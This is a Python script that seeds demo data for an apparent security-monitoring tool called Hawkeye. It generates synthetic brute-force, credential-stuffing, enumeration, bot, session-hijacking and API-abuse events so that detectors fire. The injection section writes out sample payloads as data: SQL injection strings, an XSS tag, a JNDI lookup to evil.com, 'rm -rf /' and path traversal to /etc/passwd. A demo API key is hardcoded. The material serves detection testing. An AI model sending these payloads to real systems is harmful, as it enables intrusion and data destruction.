#!/usr/bin/env python3
"""
Hawkeye Demo Data Seeding Script

Populates the database with realistic security events across multiple sources
spanning the last 24 hours, triggering all 7 detection engines.

Run: python scripts/seed_demo_data.py
"""

import asyncio
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from hawkeye.config import settings
from hawkeye.core.auth import hash_api_key
from hawkeye.database import db
from hawkeye.models.events import ApplicationSource
from hawkeye.schemas.ingestion import RawEventIngest
from hawkeye.services.ingestion_service import IngestionService
from sqlmodel.ext.asyncio.session import AsyncSession


# ??? Source Definitions ??????????????????????????????????????????????

# Frontend hardcoded demo key (from frontend/.env and frontend/src/api/client.ts)
DEMO_API_KEY = "hawk_F5IHr9TsIUujgs_9E_BWsLxmQIA5pYz8aFYcggzHqH0"

SOURCES = [
    {
        "name": "Windows Endpoint",
        "description": "Corporate Windows workstations and servers",
        "api_key_name": "windows-endpoint-prod",
    },
    {
        "name": "Linux Server",
        "description": "Production Linux web servers and databases",
        "api_key_name": "linux-server-prod",
    },
    {
        "name": "Web Application",
        "description": "Main customer-facing web application",
        "api_key_name": "webapp-prod",
        "fixed_api_key": DEMO_API_KEY,  # Matches frontend hardcoded key for demo
    },
    {
        "name": "API Gateway",
        "description": "Public API gateway and microservices",
        "api_key_name": "api-gateway-prod",
    },
    {
        "name": "Firewall",
        "description": "Network firewall and perimeter security",
        "api_key_name": "firewall-prod",
    },
]

# ??? Event Templates ?????????????????????????????????????????????????

# Background normal activity
NORMAL_EVENTS = [
    {
        "event_type": "request",
        "route": "/",
        "method": "GET",
        "status_code": 200,
        "weight": 50,
    },
    {
        "event_type": "request",
        "route": "/dashboard",
        "method": "GET",
        "status_code": 200,
        "weight": 30,
    },
    {
        "event_type": "request",
        "route": "/api/health",
        "method": "GET",
        "status_code": 200,
        "weight": 20,
    },
    {
        "event_type": "request",
        "route": "/api/users/profile",
        "method": "GET",
        "status_code": 200,
        "weight": 15,
    },
    {
        "event_type": "request",
        "route": "/api/data",
        "method": "GET",
        "status_code": 200,
        "weight": 10,
    },
    {
        "event_type": "login_success",
        "route": "/login",
        "method": "POST",
        "status_code": 200,
        "weight": 8,
    },
    {
        "event_type": "logout",
        "route": "/logout",
        "method": "POST",
        "status_code": 200,
        "weight": 5,
    },
]

# Attack patterns - each triggers specific detectors
ATTACK_PATTERNS = {
    "brute_force": {
        "events": [
            {"event_type": "login_failed", "route": "/login", "method": "POST", "status_code": 401},
            {"event_type": "login_failed", "route": "/login", "method": "POST", "status_code": 401},
            {"event_type": "login_failed", "route": "/login", "method": "POST", "status_code": 401},
            {"event_type": "login_failed", "route": "/login", "method": "POST", "status_code": 401},
            {"event_type": "login_failed", "route": "/login", "method": "POST", "status_code": 401},
            {"event_type": "login_failed", "route": "/login", "method": "POST", "status_code": 401},
            {"event_type": "login_success", "route": "/login", "method": "POST", "status_code": 200},  # Compromise
        ],
        "weight": 3,
        "user_count": 2,
        "description": "Brute force on specific accounts",
    },
    "credential_stuffing": {
        "events": [
            {"event_type": "login_failed", "route": "/login", "method": "POST", "status_code": 401}
            for _ in range(25)
        ],
        "weight": 2,
        "user_count": 20,
        "description": "Credential stuffing - many usernames from single IP",
    },
    "enumeration_404": {
        "events": [
            {"event_type": "request", "method": "GET", "status_code": 404}
            for _ in range(50)
        ],
        "weight": 2,
        "description": "404 enumeration scan",
    },
    "suspicious_paths": {
        "events": [
            {"event_type": "request", "route": "/admin", "method": "GET", "status_code": 403},
            {"event_type": "request", "route": "/wp-admin", "method": "GET", "status_code": 404},
            {"event_type": "request", "route": "/.env", "method": "GET", "status_code": 403},
            {"event_type": "request", "route": "/config", "method": "GET", "status_code": 403},
            {"event_type": "request", "route": "/backup", "method": "GET", "status_code": 404},
            {"event_type": "request", "route": "/.git", "method": "GET", "status_code": 403},
            {"event_type": "request", "route": "/phpmyadmin", "method": "GET", "status_code": 404},
            {"event_type": "request", "route": "/etc/passwd", "method": "GET", "status_code": 403},
            {"event_type": "request", "route": "/proc/self/environ", "method": "GET", "status_code": 403},
            {"event_type": "request", "route": "/web.config", "method": "GET", "status_code": 404},
        ],
        "weight": 2,
        "description": "Suspicious path access",
    },
    "parameter_tampering": {
        "events": [
            {"event_type": "sql_injection", "route": "/api/search", "method": "GET", "status_code": 400},
            {"event_type": "xss_attempt", "route": "/api/users", "method": "GET", "status_code": 400},
            {"event_type": "command_injection", "route": "/api/data", "method": "POST", "status_code": 500},
        ],
        "weight": 2,
        "description": "SQL injection / parameter tampering",
    },
    "bot_traffic": {
        "events": [
            {"event_type": "request", "route": "/api/products", "method": "GET", "status_code": 200}
            for _ in range(100)
        ],
        "weight": 2,
        "description": "Automated bot scraping",
    },
    "headless_browser": {
        "events": [
            {"event_type": "headless_browser_detected", "route": "/dashboard", "method": "GET", "status_code": 200},
            {"event_type": "automation_detected", "route": "/api/data", "method": "GET", "status_code": 200},
            {"event_type": "devtools_detected", "route": "/login", "method": "GET", "status_code": 200},
        ],
        "weight": 1,
        "description": "Headless browser / automation detection",
    },
    "session_hijacking": {
        "events": [
            {"event_type": "request", "route": "/dashboard", "method": "GET", "status_code": 200},
            {"event_type": "request", "route": "/api/profile", "method": "GET", "status_code": 200},
            {"event_type": "login_success", "route": "/login", "method": "POST", "status_code": 200},
        ],
        "weight": 1,
        "description": "Impossible travel / session hijacking",
    },
    "sensitive_actions": {
        "events": [
            {"event_type": "admin_access", "route": "/admin/users", "method": "GET", "status_code": 200},
            {"event_type": "data_export", "route": "/admin/export", "method": "POST", "status_code": 200},
            {"event_type": "role_changed", "route": "/admin/users/123", "method": "PUT", "status_code": 200},
            {"event_type": "api_key_created", "route": "/admin/api-keys", "method": "POST", "status_code": 201},
            {"event_type": "privilege_escalation", "route": "/admin/users/123/permissions", "method": "PUT", "status_code": 200},
        ],
        "weight": 2,
        "description": "Sensitive admin actions",
    },
    "api_abuse": {
        "events": [
            {"event_type": "api_access", "route": f"/api/v1/users/{i}", "method": "GET", "status_code": 200}
            for i in range(1, 50)
        ] + [
            {"event_type": "api_access", "route": "/api/v1/users/1", "method": "GET", "status_code": 401},
            {"event_type": "api_access", "route": "/api/v1/users/1", "method": "GET", "status_code": 401},
            {"event_type": "api_access", "route": "/api/v1/users/1", "method": "GET", "status_code": 401},
            {"event_type": "api_access", "route": "/api/v1/users/1", "method": "GET", "status_code": 200},
        ],
        "weight": 2,
        "description": "API endpoint enumeration + auth bypass",
    },
}

# ??? User Agents ?????????????????????????????????????????????????????

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

BOT_UAS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 puppeteer",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 playwrigh",
]

# ??? IP Addresses ?????????????????????????????????????????????????????

# Legitimate user IPs (different subnets for impossible travel)
USER_IPS = {
    "user_alice": ["192.168.1.10", "192.168.1.11", "10.0.1.50"],
    "user_bob": ["192.168.1.20", "192.168.1.21", "10.0.1.51"],
    "user_charlie": ["192.168.1.30", "192.168.1.31", "10.0.1.52"],
    "user_diana": ["192.168.1.40", "192.168.1.41", "10.0.1.53"],
    "user_eve": ["192.168.1.50", "192.168.1.51", "10.0.1.54"],
}

# Attacker IPs
ATTACKER_IPS = {
    "brute_force": "203.0.113.10",
    "cred_stuffing": "203.0.113.10",  # Same IP for correlation
    "enumeration": "203.0.113.10",   # Same IP for correlation
    "suspicious": "203.0.113.10",    # Same IP for correlation
    "injection": "203.0.113.10",     # Same IP for correlation
    "bot": "203.0.113.60",
    "headless": "203.0.113.70",
    "hijack": ["203.0.113.80", "198.51.100.10"],  # Different subnets for impossible travel
    "sensitive": "203.0.113.10",     # Same IP for correlation
    "api_abuse": "203.0.113.10",     # Same IP for correlation
}

# Background traffic IPs
BACKGROUND_IPS = [
    "192.168.1.100", "192.168.1.101", "192.168.1.102", "192.168.1.103",
    "10.0.0.10", "10.0.0.11", "10.0.0.12", "10.0.0.13",
    "172.16.0.10", "172.16.0.11", "172.16.0.12", "172.16.0.13",
]

# ??? Routes ???????????????????????????????????????????????????????????

COMMON_ROUTES = [
    "/", "/dashboard", "/profile", "/settings", "/api/health",
    "/api/users", "/api/data", "/api/products", "/api/orders",
    "/login", "/logout", "/register", "/password/reset",
    "/admin", "/admin/users", "/admin/settings", "/admin/logs",
]

ADMIN_ROUTES = [
    "/admin", "/admin/users", "/admin/users/123", "/admin/roles",
    "/admin/permissions", "/admin/api-keys", "/admin/logs", "/admin/export",
]

API_ROUTES = [
    "/api/v1/users", "/api/v1/users/1", "/api/v1/users/2", "/api/v1/users/3",
    "/api/v1/products", "/api/v1/products/1", "/api/v1/orders", "/api/v1/orders/1",
    "/api/v1/data", "/api/v1/search", "/api/v1/export", "/api/v1/health",
]


# ??? Helper Functions ????????????????????????????????????????????????

def random_time_last_24h() -> datetime:
    """Generate a random timestamp within the last 60 minutes (for detection window)."""
    now = datetime.utcnow()
    # Generate events within last 30-60 minutes so they're in detection window
    minutes_ago = random.uniform(5, 55)
    return now - timedelta(minutes=minutes_ago)


def random_time_in_window(start: datetime, end: datetime) -> datetime:
    """Random time between start and end."""
    delta = end - start
    return start + timedelta(seconds=random.uniform(0, delta.total_seconds()))


def weighted_choice(choices: list[dict]) -> dict:
    """Select from choices weighted by 'weight' key."""
    total = sum(c.get("weight", 1) for c in choices)
    r = random.uniform(0, total)
    for c in choices:
        r -= c.get("weight", 1)
        if r <= 0:
            return c
    return choices[-1]


def generate_session_id() -> str:
    """Generate a session ID."""
    return f"sess_{random.randint(100000, 999999)}_{random.randint(1000, 9999)}"


def build_event(
    event_template: dict,
    source_id: int,
    timestamp: datetime,
    user_id: str | None = None,
    session_id: str | None = None,
    ip: str | None = None,
    user_agent: str | None = None,
    route: str | None = None,
    method: str | None = None,
    metadata: dict | None = None,
) -> RawEventIngest:
    """Build a RawEventIngest from template with overrides."""
    return RawEventIngest(
        event_type=event_template["event_type"],
        timestamp=timestamp,
        user_id=user_id,
        session_id=session_id,
        ip=ip,
        user_agent=user_agent,
        route=route or event_template.get("route"),
        method=method or event_template.get("method", "GET"),
        status_code=event_template.get("status_code"),
        metadata=metadata,
    )


# ??? Seeding Logic ???????????????????????????????????????????????????

async def seed_sources(session: AsyncSession) -> list[ApplicationSource]:
    """Create sources with API keys. Updates Web Application demo source to use fixed key."""
    print("[BOX] Creating sources...")
    sources = []

    from hawkeye.models.events import ApiKey
    from sqlmodel import select, delete

    for src in SOURCES:
        # Check if source already exists
        stmt = select(ApplicationSource).where(ApplicationSource.name == src["name"])
        result = await session.exec(stmt)
        existing = result.first()

        # Determine the API key to use
        if "fixed_api_key" in src:
            raw_key = src["fixed_api_key"]
        else:
            raw_key = f"hk_{src['api_key_name']}_{random.randint(100000, 999999)}"
        key_hash = hash_api_key(raw_key)
        key_prefix = raw_key[:8]

        if existing:
            # For Web Application demo source, always update to fixed key
            if "fixed_api_key" in src:
                print(f"  [UPDATE] Source '{src['name']}' exists — updating to fixed demo API key")
                # Update source's api_key_hash
                existing.api_key_hash = key_hash
                # Delete ANY ApiKey records with this key_hash (unique constraint)
                await session.exec(delete(ApiKey).where(ApiKey.key_hash == key_hash))
                # Also delete old ApiKey records for this source (cleanup)
                await session.exec(delete(ApiKey).where(ApiKey.source_id == existing.id))
                # Create new ApiKey record with fixed key
                api_key = ApiKey(
                    source_id=existing.id,
                    key_hash=key_hash,
                    key_prefix=key_prefix,
                    name=src["api_key_name"],
                    description=f"Demo key for {src['name']}",
                    is_active=True,
                )
                session.add(api_key)
                print(f"  [OK] Updated source: {src['name']} (API Key: {raw_key})")
            else:
                print(f"  [SKIP]  Source '{src['name']}' already exists, skipping")
            sources.append(existing)
            continue

        # Create new source
        source = ApplicationSource(
            name=src["name"],
            description=src["description"],
            api_key_hash=key_hash,
            is_active=True,
        )
        session.add(source)
        await session.flush()

        # Add API key record
        api_key = ApiKey(
            source_id=source.id,
            key_hash=key_hash,
            key_prefix=key_prefix,
            name=src["api_key_name"],
            description=f"Auto-generated for {src['name']}",
            is_active=True,
        )
        session.add(api_key)

        print(f"  [OK] Created source: {src['name']} (API Key: {raw_key})")
        sources.append(source)

    await session.commit()
    return sources


async def seed_background_traffic(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed normal background traffic across all sources."""
    print("\n[WEB] Seeding background traffic...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        # Each source gets ~500-1000 normal events
        num_events = random.randint(500, 1000)
        print(f"  [STATS] {source.name}: {num_events} normal events")

        events = []
        for _ in range(num_events):
            template = weighted_choice(NORMAL_EVENTS)
            timestamp = random_time_last_24h()
            user = random.choice(list(USER_IPS.keys()))
            user_ip = random.choice(USER_IPS[user])

            event = build_event(
                template,
                source_id=source.id,
                timestamp=timestamp,
                user_id=user,
                session_id=generate_session_id(),
                ip=user_ip,
                user_agent=random.choice(BROWSER_UAS),
                route=template.get("route", random.choice(COMMON_ROUTES)),
            )
            events.append(event)

        # Batch ingest in chunks of 100
        for i in range(0, len(events), 100):
            batch = events[i:i+100]
            try:
                from hawkeye.schemas.ingestion import BatchEventsIngest
                await service.ingest_batch(BatchEventsIngest(events=batch), source)
                total += len(batch)
            except Exception as e:
                print(f"    [WARN]  Batch failed: {e}")

    print(f"  [OK] Background traffic: {total} events")
    return total


async def seed_brute_force(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed brute force attacks - targets specific users from single IP."""
    print("\n[SEED] Seeding brute force attacks...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        pattern = ATTACK_PATTERNS["brute_force"]
        attacker_ip = ATTACKER_IPS["brute_force"]
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 curl/8.5.0"

        # Pick 2 users to target
        target_users = random.sample(list(USER_IPS.keys()), min(2, len(USER_IPS)))

        for user in target_users:
            # Attack window: 10 minutes
            attack_start = random_time_last_24h()
            attack_end = attack_start + timedelta(minutes=10)

            print(f"  [TARGET] {source.name}: Brute force on {user} from {attacker_ip}")

            session_id = generate_session_id()
            events = []

            for i, template in enumerate(pattern["events"]):
                timestamp = random_time_in_window(attack_start, attack_end)

                # Last event is success (compromise)
                is_success = template["event_type"] == "login_success"

                event = build_event(
                    template,
                    source_id=source.id,
                    timestamp=timestamp,
                    user_id=user,
                    session_id=session_id,
                    ip=attacker_ip,
                    user_agent=user_agent,
                )
                events.append(event)

            # Ingest
            from hawkeye.schemas.ingestion import BatchEventsIngest
            await service.ingest_batch(BatchEventsIngest(events=events), source)
            total += len(events)

    print(f"  [OK] Brute force: {total} events")
    return total


async def seed_credential_stuffing(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed credential stuffing - many usernames from single IP."""
    print("\n[SEED] Seeding credential stuffing...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        pattern = ATTACK_PATTERNS["credential_stuffing"]
        attacker_ip = ATTACKER_IPS["cred_stuffing"]
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) Python-requests/2.31.0"

        # Attack window: 5 minutes
        attack_start = random_time_last_24h()
        attack_end = attack_start + timedelta(minutes=5)

        print(f"  [TARGET] {source.name}: Credential stuffing from {attacker_ip}")

        # Many different usernames
        usernames = [f"user{i}" for i in range(1, 21)] + list(USER_IPS.keys())

        events = []
        for i, template in enumerate(pattern["events"]):
            timestamp = random_time_in_window(attack_start, attack_end)
            username = random.choice(usernames)

            event = build_event(
                template,
                source_id=source.id,
                timestamp=timestamp,
                user_id=username,
                session_id=generate_session_id(),
                ip=attacker_ip,
                user_agent=user_agent,
            )
            events.append(event)

        # Ingest in batches
        from hawkeye.schemas.ingestion import BatchEventsIngest
        for i in range(0, len(events), 50):
            await service.ingest_batch(BatchEventsIngest(events=events[i:i+50]), source)
        total += len(events)

    print(f"  [OK] Credential stuffing: {total} events")
    return total


async def seed_enumeration(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed 404 enumeration and suspicious path access."""
    print("\n[SEARCH] Seeding enumeration attacks...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        attacker_ip = ATTACKER_IPS["enumeration"]
        user_agent = "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

        # 404 Enumeration
        attack_start = random_time_last_24h()
        attack_end = attack_start + timedelta(minutes=3)

        print(f"  [TARGET] {source.name}: 404 enumeration from {attacker_ip}")

        events = []
        enum_paths = [
            "/admin", "/wp-admin", "/phpmyadmin", "/.env", "/config", "/backup",
            "/.git", "/.svn", "/.DS_Store", "/web.config", "/phpinfo.php",
            "/test", "/dev", "/staging", "/api/v1", "/api/v2", "/api/docs",
            "/swagger", "/graphql", "/health", "/metrics", "/actuator",
            "/server-status", "/server-info", "/robots.txt", "/sitemap.xml",
        ]

        for i in range(50):
            timestamp = random_time_in_window(attack_start, attack_end)
            route = random.choice(enum_paths)

            event = build_event(
                {"event_type": "request", "method": "GET", "status_code": 404, "route": route},
                source_id=source.id,
                timestamp=timestamp,
                user_id=None,
                session_id=generate_session_id(),
                ip=attacker_ip,
                user_agent=user_agent,
                route=route,
            )
            events.append(event)

        from hawkeye.schemas.ingestion import BatchEventsIngest
        for i in range(0, len(events), 25):
            await service.ingest_batch(BatchEventsIngest(events=events[i:i+25]), source)
        total += len(events)

        # Suspicious paths
        print(f"  [TARGET] {source.name}: Suspicious path access from {ATTACKER_IPS['suspicious']}")

        suspicious_events = []
        for template in ATTACK_PATTERNS["suspicious_paths"]["events"]:
            timestamp = random_time_in_window(attack_start, attack_end + timedelta(minutes=5))
            event = build_event(
                template,
                source_id=source.id,
                timestamp=timestamp,
                user_id=None,
                session_id=generate_session_id(),
                ip=ATTACKER_IPS["suspicious"],
                user_agent=user_agent,
            )
            suspicious_events.append(event)

        await service.ingest_batch(BatchEventsIngest(events=suspicious_events), source)
        total += len(suspicious_events)

    print(f"  [OK] Enumeration: {total} events")
    return total


async def seed_parameter_tampering(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed SQL injection and parameter tampering attempts."""
    print("\n[INJECT] Seeding parameter tampering...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        attacker_ip = ATTACKER_IPS["injection"]
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) curl/8.5.0"

        attack_start = random_time_last_24h()
        attack_end = attack_start + timedelta(minutes=5)

        print(f"  [TARGET] {source.name}: Parameter tampering from {attacker_ip}")

        injection_payloads = [
            {"event_type": "sql_injection", "q": "' OR '1'='1", "route": "/api/search", "method": "GET", "status_code": 400},
            {"event_type": "sql_injection", "id": "1 UNION SELECT * FROM users", "route": "/api/users/1", "method": "GET", "status_code": 400},
            {"event_type": "xss_attempt", "search": "<script>alert(1)</script>", "route": "/api/search", "method": "GET", "status_code": 400},
            {"event_type": "command_injection", "input": "${jndi:ldap://evil.com/a}", "route": "/api/data", "method": "POST", "status_code": 500},
            {"event_type": "command_injection", "cmd": "rm -rf /", "route": "/api/exec", "method": "POST", "status_code": 500},
            {"event_type": "path_traversal", "param": "../../etc/passwd", "route": "/api/file", "method": "GET", "status_code": 400},
        ]

        events = []
        for payload in injection_payloads:
            timestamp = random_time_in_window(attack_start, attack_end)
            event_type = payload.pop("event_type")
            route = payload.pop("route")
            method = payload.pop("method")
            status_code = payload.pop("status_code")
            event = build_event(
                {"event_type": event_type, "status_code": status_code},
                source_id=source.id,
                timestamp=timestamp,
                user_id=None,
                session_id=generate_session_id(),
                ip=attacker_ip,
                user_agent=user_agent,
                route=route,
                method=method,
                metadata={"query_params": payload},
            )
            events.append(event)

        from hawkeye.schemas.ingestion import BatchEventsIngest
        await service.ingest_batch(BatchEventsIngest(events=events), source)
        total += len(events)

    print(f"  [OK] Parameter tampering: {total} events")
    return total


async def seed_bot_traffic(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed automated bot scraping."""
    print("\n[BOT] Seeding bot traffic...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        attacker_ip = ATTACKER_IPS["bot"]

        attack_start = random_time_last_24h()
        attack_end = attack_start + timedelta(minutes=10)

        print(f"  [TARGET] {source.name}: Bot scraping from {attacker_ip}")

        events = []
        for i in range(200):
            timestamp = random_time_in_window(attack_start, attack_end)
            route = random.choice(API_ROUTES)
            ua = random.choice(BOT_UAS)

            event = build_event(
                {"event_type": "request", "method": "GET", "status_code": 200, "route": route},
                source_id=source.id,
                timestamp=timestamp,
                user_id=None,
                session_id=generate_session_id(),
                ip=attacker_ip,
                user_agent=ua,
                route=route,
            )
            events.append(event)

        from hawkeye.schemas.ingestion import BatchEventsIngest
        for i in range(0, len(events), 50):
            await service.ingest_batch(BatchEventsIngest(events=events[i:i+50]), source)
        total += len(events)

    print(f"  [OK] Bot traffic: {total} events")
    return total


async def seed_headless_browser(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed headless browser / automation detection events."""
    print("\n[TEST] Seeding headless browser detection...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        attacker_ip = ATTACKER_IPS["headless"]
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36"

        attack_start = random_time_last_24h()
        attack_end = attack_start + timedelta(minutes=5)

        print(f"  [TARGET] {source.name}: Headless browser from {attacker_ip}")

        events = []
        for template in ATTACK_PATTERNS["headless_browser"]["events"]:
            timestamp = random_time_in_window(attack_start, attack_end)
            event = build_event(
                template,
                source_id=source.id,
                timestamp=timestamp,
                user_id="user_alice",
                session_id=generate_session_id(),
                ip=attacker_ip,
                user_agent=user_agent,
            )
            events.append(event)

        from hawkeye.schemas.ingestion import BatchEventsIngest
        await service.ingest_batch(BatchEventsIngest(events=events), source)
        total += len(events)

    print(f"  [OK] Headless browser: {total} events")
    return total


async def seed_session_hijacking(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed impossible travel / session hijacking."""
    print("\n[HIJACK] Seeding session hijacking (impossible travel)...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        ip1, ip2 = ATTACKER_IPS["hijack"]
        user = "user_alice"
        session_id = f"hijack_{random.randint(100000, 999999)}"

        # First session from IP1 (legitimate location)
        print(f"  [TARGET] {source.name}: Session from {ip1} then {ip2} (impossible travel)")

        # Legitimate activity from IP1
        attack_start = random_time_last_24h()
        legit_end = attack_start + timedelta(minutes=30)

        events = []
        for i in range(10):
            timestamp = random_time_in_window(attack_start, legit_end)
            route = random.choice(COMMON_ROUTES)
            event = build_event(
                {"event_type": "request", "method": "GET", "status_code": 200, "route": route},
                source_id=source.id,
                timestamp=timestamp,
                user_id=user,
                session_id=session_id,
                ip=ip1,
                user_agent=random.choice(BROWSER_UAS),
                route=route,
            )
            events.append(event)

        # Login success from IP1
        login_time = legit_end
        events.append(build_event(
            {"event_type": "login_success", "route": "/login", "method": "POST", "status_code": 200},
            source_id=source.id,
            timestamp=login_time,
            user_id=user,
            session_id=session_id,
            ip=ip1,
            user_agent=random.choice(BROWSER_UAS),
        ))

        # Now hijacked session from IP2 (different continent - 5000km away)
        hijack_start = login_time + timedelta(minutes=30)
        hijack_end = hijack_start + timedelta(minutes=20)

        for i in range(10):
            timestamp = random_time_in_window(hijack_start, hijack_end)
            route = random.choice(COMMON_ROUTES)
            event = build_event(
                {"event_type": "request", "method": "GET", "status_code": 200, "route": route},
                source_id=source.id,
                timestamp=timestamp,
                user_id=user,
                session_id=session_id,
                ip=ip2,
                user_agent=random.choice(BROWSER_UAS),
                route=route,
            )
            events.append(event)

        from hawkeye.schemas.ingestion import BatchEventsIngest
        for i in range(0, len(events), 20):
            await service.ingest_batch(BatchEventsIngest(events=events[i:i+20]), source)
        total += len(events)

    print(f"  [OK] Session hijacking: {total} events")
    return total


async def seed_sensitive_actions(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed sensitive admin actions."""
    print("\n[SECURE] Seeding sensitive actions...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        attacker_ip = ATTACKER_IPS["sensitive"]
        user = "user_bob"  # Compromised admin
        user_agent = random.choice(BROWSER_UAS)

        attack_start = random_time_last_24h()
        attack_end = attack_start + timedelta(hours=2)

        print(f"  [TARGET] {source.name}: Sensitive admin actions from {attacker_ip}")

        events = []
        for template in ATTACK_PATTERNS["sensitive_actions"]["events"]:
            timestamp = random_time_in_window(attack_start, attack_end)
            route = template.get("route", random.choice(ADMIN_ROUTES))
            event = build_event(
                template,
                source_id=source.id,
                timestamp=timestamp,
                user_id=user,
                session_id=generate_session_id(),
                ip=attacker_ip,
                user_agent=user_agent,
                route=route,
            )
            events.append(event)

        from hawkeye.schemas.ingestion import BatchEventsIngest
        await service.ingest_batch(BatchEventsIngest(events=events), source)
        total += len(events)

    print(f"  [OK] Sensitive actions: {total} events")
    return total


async def seed_api_abuse(session: AsyncSession, sources: list[ApplicationSource]) -> int:
    """Seed API abuse - enumeration + auth bypass."""
    print("\n[API] Seeding API abuse...")
    service = IngestionService(session)
    total = 0

    for source in sources:
        attacker_ip = ATTACKER_IPS["api_abuse"]
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) python-requests/2.31.0"

        attack_start = random_time_last_24h()
        attack_end = attack_start + timedelta(minutes=10)

        print(f"  [TARGET] {source.name}: API enumeration + auth bypass from {attacker_ip}")

        events = []
        for template in ATTACK_PATTERNS["api_abuse"]["events"]:
            timestamp = random_time_in_window(attack_start, attack_end)
            route = template.get("route", random.choice(API_ROUTES))
            event = build_event(
                template,
                source_id=source.id,
                timestamp=timestamp,
                user_id=None,
                session_id=generate_session_id(),
                ip=attacker_ip,
                user_agent=user_agent,
                route=route,
            )
            events.append(event)

        from hawkeye.schemas.ingestion import BatchEventsIngest
        await service.ingest_batch(BatchEventsIngest(events=events), source)
        total += len(events)

    print(f"  [OK] API abuse: {total} events")
    return total


async def verify_results(session: AsyncSession) -> dict[str, Any]:
    """Verify seeding results by querying the database."""
    print("\n[SEARCH] Verifying results...")
    from sqlmodel import select, func
    from hawkeye.models.events import (
        NormalizedEvent, Alert, Incident, ApplicationSource
    )

    # Count events
    stmt = select(func.count(NormalizedEvent.id))
    result = await session.exec(stmt)
    total_events = result.one()

    # Count by source
    stmt = select(ApplicationSource.name, func.count(NormalizedEvent.id)).join(
        NormalizedEvent, ApplicationSource.id == NormalizedEvent.source_id
    ).group_by(ApplicationSource.id)
    result = await session.exec(stmt)
    events_by_source = dict(result.all())

    # Count alerts
    stmt = select(func.count(Alert.id))
    result = await session.exec(stmt)
    total_alerts = result.one()

    # Alerts by detection type
    stmt = select(Alert.detection_type, func.count(Alert.id)).group_by(Alert.detection_type)
    result = await session.exec(stmt)
    alerts_by_type = dict(result.all())

    # Alerts by severity
    stmt = select(Alert.severity, func.count(Alert.id)).group_by(Alert.severity)
    result = await session.exec(stmt)
    alerts_by_severity = dict(result.all())

    # Incidents
    stmt = select(func.count(Incident.id))
    result = await session.exec(stmt)
    total_incidents = result.one()

    # Events by category
    stmt = select(NormalizedEvent.category, func.count(NormalizedEvent.id)).group_by(NormalizedEvent.category)
    result = await session.exec(stmt)
    events_by_category = dict(result.all())

    # Events by event_type
    stmt = select(NormalizedEvent.event_type, func.count(NormalizedEvent.id)).group_by(NormalizedEvent.event_type)
    result = await session.exec(stmt)
    events_by_type = dict(result.all())

    # MITRE coverage
    stmt = select(NormalizedEvent.mitre_tactic, func.count(NormalizedEvent.id)).where(
        NormalizedEvent.mitre_tactic.is_not(None)
    ).group_by(NormalizedEvent.mitre_tactic)
    result = await session.exec(stmt)
    mitre_tactics = dict(result.all())

    print(f"  [STATS] Total Events: {total_events}")
    print(f"  [STATS] Events by Source: {events_by_source}")
    print(f"  [STATS] Events by Category: {events_by_category}")
    print(f"  [STATS] Total Alerts: {total_alerts}")
    print(f"  [STATS] Alerts by Type: {alerts_by_type}")
    print(f"  [STATS] Alerts by Severity: {alerts_by_severity}")
    print(f"  [STATS] Total Incidents: {total_incidents}")
    print(f"  [STATS] MITRE Tactics: {mitre_tactics}")

    return {
        "total_events": total_events,
        "events_by_source": events_by_source,
        "events_by_category": events_by_category,
        "events_by_type": events_by_type,
        "total_alerts": total_alerts,
        "alerts_by_type": alerts_by_type,
        "alerts_by_severity": alerts_by_severity,
        "total_incidents": total_incidents,
        "mitre_tactics": mitre_tactics,
    }


# ??? Main Entry Point ????????????????????????????????????????????????

async def main():
    """Main seeding function."""
    print("=" * 60)
    print("[SEED] Hawkeye Demo Data Seeder")
    print("=" * 60)
